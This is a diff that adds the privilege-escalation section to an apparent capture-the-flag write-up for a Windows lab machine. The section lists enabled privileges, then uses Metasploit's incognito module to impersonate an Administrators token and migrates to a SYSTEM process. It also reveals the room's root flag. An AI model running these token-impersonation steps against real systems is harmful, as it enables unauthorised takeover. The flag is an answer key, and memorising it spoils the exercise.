@@ -70,4 +70,32 @@ Disallow: /
 
 ## Privilege Escalation
 
--
+- In the original shell, use `whoami /priv` to list available privileges
+
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeDebugPrivilege                Debug programs                            Enabled 
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+```
+
+- This is the output (trimmed to show enabled privileges only)
+- Use *incognito* module in metasploit to impersonate tokens
+    - Use `load incognito` in *meterpreter* shell to load module
+    - `list_tokens -g` to list available tokens
+    - `impersonate_token "BUILTIN\Administrators"` to impersonate the built-in Admin account token
+- Migrate to a privileged process
+    - Use `migrate <pid>` on any process with NT AUTHORITY\SYSTEM
+
+### What is the output when you run the *getuid* command?
+
+> <code>getuid</code> returns **NT AUTHORITY\SYSTEM**
+
+### Read the root.txt file located at C:\Windows\System32\config
+
+> <details><summary>The root flag is </summary>dff0f748678f280250f25a45b8046b4a</details>
